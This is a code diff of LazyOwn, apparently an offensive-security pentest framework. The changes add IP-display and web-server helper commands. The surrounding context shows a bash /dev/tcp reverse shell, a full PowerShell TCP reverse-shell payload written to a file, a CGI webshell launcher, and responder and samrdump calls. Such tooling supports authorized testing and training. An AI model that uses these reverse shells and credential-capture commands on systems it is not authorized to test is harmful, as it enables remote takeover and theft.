@@ -71,13 +71,14 @@ def is_binary_present(binary_name):
 
 class LazyOwnShell(Cmd):
     prompt = "LazyOwn> "
-    intro = """Welcome to the LazyOwn Framework [;,;] interactive shell! Type ? to list commands
+    intro = """\nWelcome to the LazyOwn Framework [;,;] interactive shell! Type ? to list commands
 Github: https://github.com/grisuno/LazyOwn
 Web: https://grisuno.github.io/LazyOwn/
 Reddit: https://www.reddit.com/r/LazyOwn/
 Facebook: https://web.facebook.com/profile.php?id=61560596232150
 hackTheBox: https://app.hackthebox.com/teams/overview/6429
 """
+    os.system("ip a show scope global | awk '/^[0-9]+:/ { sub(/:/,\"\",$2); iface=$2 } /^[[:space:]]*inet / { split($2, a, \"/\"); print \"[\033[96m\" iface\"\033[0m] \"a[1] }'")
 
     def __init__(self):
         super().__init__()
@@ -633,11 +634,13 @@ hackTheBox: https://app.hackthebox.com/teams/overview/6429
         print("[f] Fix script perm")
         os.system("chmod +x modules/*.sh")
         os.system("chmod +x modules/cgi-bin/*")
+        return
 
     def do_lazywebshell(self, line):
         """LazyOwn shell"""
-        print("[r] Running Server in localhost:8080/cgi-bin/lazywebshell.py")
-        os.system("cd modules && python3 -m http.server 8080 --cgi &")
+        print("[r] Running Server in localhost:8888/cgi-bin/lazywebshell.py")
+        os.system("cd modules && python3 -m http.server 8888 --cgi &")
+        return
 
     def do_getcap(self, line):
         """try get capabilities :)"""
@@ -1093,12 +1096,12 @@ bash -c "bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
 $client = New-Object System.Net.Sockets.TCPClient(\"{lhost}\",{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex ". { $data } 2>&1" | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
 """.replace('{lhost}',lhost).replace('{lport}',str(lport))
 
-        print(f"[*] Try... echo '{revshell}' > sessions/revshell.ps1 ")
+        print(f"[*] Try... echo '{revshell}' > sessions/revshell.ps1 \n")
         
         with open(filename, 'w') as f:
             f.write(revshell)
         f.close()
-        print(f"Archivo {filename} creado con èxito en el directorio sessions con contenido: {revshell} ")
+        print(f"[*] Archivo {filename} creado con èxito en el directorio sessions con contenido: {revshell} ")
 
     def do_createhash(self, line):
         """Crea un archivo hash.txt en el directorio sessions"""
@@ -1157,7 +1160,23 @@ $client = New-Object System.Net.Sockets.TCPClient(\"{lhost}\",{lport});$stream =
         print(f"sudo responder -I {device}")
         os.system(f"sudo responder -I {device}")
         return
-        
+
+    def do_ip(self,line):
+        """ip a show scope global | awk '/^[0-9]+:/ { sub(/:/,\"\",$2); iface=$2 } /^[[:space:]]*inet / { split($2, a, \"/\"); print \"[\033[96m\" iface\"\033[0m] \"a[1] }' and copy de ip to clipboard :)"""
+        os.system("ip a show scope global | awk '/^[0-9]+:/ { sub(/:/,\"\",$2); iface=$2 } /^[[:space:]]*inet / { split($2, a, \"/\"); print \"[\033[96m\" iface\"\033[0m] \"a[1] }'")
+        os.system("ip a show tun0 | grep 'inet ' | awk '{print $2}' | cut -d'/' -f1 | xclip -sel clip")
+        print("[*] ip from tun0 copied to clipboard :)")
+        return
+
+    def do_www(slf, line):
+        """Start a web server with python3"""
+        os.system("ip a show scope global | awk '/^[0-9]+:/ { sub(/:/,\"\",$2); iface=$2 } /^[[:space:]]*inet / { split($2, a, \"/\"); print \"[\033[96m\" iface\"\033[0m] \"a[1] }'")
+        os.system("ip a show tun0 | grep 'inet ' | awk '{print $2}' | cut -d'/' -f1 | xclip -sel clip")
+        os.system('echo -e "[\e[96m`pwd`\e[0m]\e[34m" && cd sessions && ls && echo -en "\e[0m"')
+        os.system("cd sessions && sudo python3 -m http.server 80")
+        print("[*] Web server at sessions in port 80")
+        return
+
     def do_samrdump(self, line):
         """impacket-samrdump -port 445 10.10.10.10"""
         if not self.params["rhost"]:
@@ -1170,6 +1189,7 @@ $client = New-Object System.Net.Sockets.TCPClient(\"{lhost}\",{lport});$stream =
         os.system(f"impacket-samrdump -port 445  {rhost}")
 
         return
+
     def do_encrypt(self, line):
         """Encrypt a file using XOR. Usage: encrypt <file_path> <key>"""
         args = shlex.split(line)
